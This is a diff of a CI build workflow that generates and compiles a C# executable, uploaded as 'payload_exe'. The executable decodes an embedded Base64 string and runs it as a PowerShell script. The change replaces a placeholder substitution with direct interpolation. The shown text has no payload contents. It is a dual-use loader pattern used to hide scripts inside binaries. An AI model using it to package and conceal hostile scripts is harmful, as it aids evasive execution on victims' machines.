@@ -45,18 +45,19 @@ jobs:
         using System;
         using System.Management.Automation;
         using System.Text;
-        
+
         class Program {
             static void Main() {
-                string b64 = ""{B64_PLACEHOLDER}"";
+                string b64 = `"$b64`"; // Base64-encoded PowerShell script
                 string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+
                 using (PowerShell ps = PowerShell.Create()) {
                     ps.AddScript(script);
                     ps.Invoke();
                 }
             }
         }
-        "@ -replace "{B64_PLACEHOLDER}", $b64
+        "@
 
         Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
 
@@ -70,4 +71,5 @@ jobs:
       with:
         name: payload_exe
         path: PowerShellRunner/bin/Release/net8.0/PowerShellRunner.exe
+
 
